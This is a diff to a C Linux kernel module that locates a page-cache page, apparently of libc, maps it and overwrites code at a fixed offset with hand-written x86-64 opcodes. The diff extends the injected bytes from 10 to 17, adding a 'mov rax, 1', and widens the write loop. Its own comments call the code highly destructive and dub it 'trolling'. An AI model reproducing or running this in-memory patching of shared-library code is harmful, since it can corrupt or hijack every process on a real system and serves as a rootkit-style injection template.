@@ -16,7 +16,7 @@
 char* troll = "trolled";
 
 
-char trolling_opcodes[] = { 0x48, 0xC7, 0xC6, 0x30, 0xD0, 0x19, 0x00, 0x90, 0x90, 0x90 }; //append with a shit ton of nops
+char trolling_opcodes[] = { 0x48, 0xC7, 0xC6, 0x30, 0xD0, 0x19, 0x00, 0x90, 0x90, 0x90, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00  }; //append with a shit ton of nops
 int init_module(void)
 {
  	void* map;
@@ -44,14 +44,21 @@ int init_module(void)
     printk(KERN_INFO "Page failed\n");
     return 0;
   }
+  /*
+  page = find_page_inode(i, 0);
+  if(!page){
+    printk(KERN_INFO "Page failed\n");
+    return 0;
+  }
+  map = kmap(page);
 
-  /*map = kmap(page);
   *((char*)map) = 'A';
-  kunmap(page);*/
+  kunmap(page);
+  */
 
 
   /*
-  THE UNCOMMENTED CODE BELOW IS HIGHLY DESTRUCTIVE. DO NOT, UNDER ANY CIRCUMSTANCE, RUN IT
+  THE CODE BELOW IS HIGHLY DESTRUCTIVE. DO NOT, UNDER ANY CIRCUMSTANCE, RUN IT AGAINST THE REAL LIBC
 
   */
 
@@ -75,7 +82,7 @@ int init_module(void)
   }
   map = kmap(page);
   ptr = (char*)map + pg_off(0x001111d4);
-  for(count = 0; count < 10; count++, ptr++){
+  for(count = 0; count < 17; count++, ptr++){
     *ptr = trolling_opcodes[count];
   }
   kunmap(map);
